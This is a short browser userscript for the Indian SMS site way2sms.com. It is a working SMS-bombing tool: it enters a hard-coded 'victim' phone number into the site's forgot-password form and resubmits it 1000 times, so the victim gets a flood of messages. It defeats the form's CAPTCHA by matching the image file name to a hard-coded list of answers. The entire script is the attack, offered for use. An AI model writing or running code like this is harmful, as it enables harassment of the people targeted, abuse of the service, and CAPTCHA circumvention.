// ==UserScript==
// @name                   Way2SMS
// @namespace           Yastika
// @include                 http://*.*way2sms.com/*
// ==/UserScript==

var victim = 9023562683; // ENTER VICTIM'S NUMBER
var n = 1000;
if(document.location=="http://site1.way2sms.com/jsp/ForgotPassword.jsp")
{

for(var i = 0; i < n; i++)
sendSMS(victim);

}

function sendSMS(victim) {
var captcha = new Array();
captcha[0] = "2kHs";
captcha[1] = "3vg6";
captcha[2] = "5gT2";
captcha[3] = "6JtN";
captcha[4] = "9K5B";
captcha[5] = "98u3";
captcha[6] = "B5Q9";
captcha[7] = "B62x";
captcha[8] = "GK8x";
captcha[9] = "H5kn";
captcha[10] = "K85Q";
captcha[11] = "K93m";
captcha[12] = "Kt3c";
captcha[13] = "L3Za";
captcha[14] = "L6du";
captcha[15] = "L8Ke";
captcha[16] = "M8K6";
captcha[17] = "M58p";
captcha[18] = "N6wT";
captcha[19] = "P6V8";
captcha[20] = "RB9K";
captcha[21] = "si5L";
captcha[22] = "T8hw";
captcha[23] = "X752";
captcha[24] = "Zp8x";
var s = document.getElementsByTagName('img')[0].src;
s = s.replace("http://images.way2sms.com/images/imc", "");
s = s.replace(".gif", "");
s--;
var cap = captcha[s];
document.forms[0].elements[2].value=victim;
document.forms[0].elements[3].value=cap;
document.forms[0].elements[4].click();
setTimeout("document.location='http://site1.way2sms.com/jsp/ForgotPassword.jsp'",10);
return 1;
}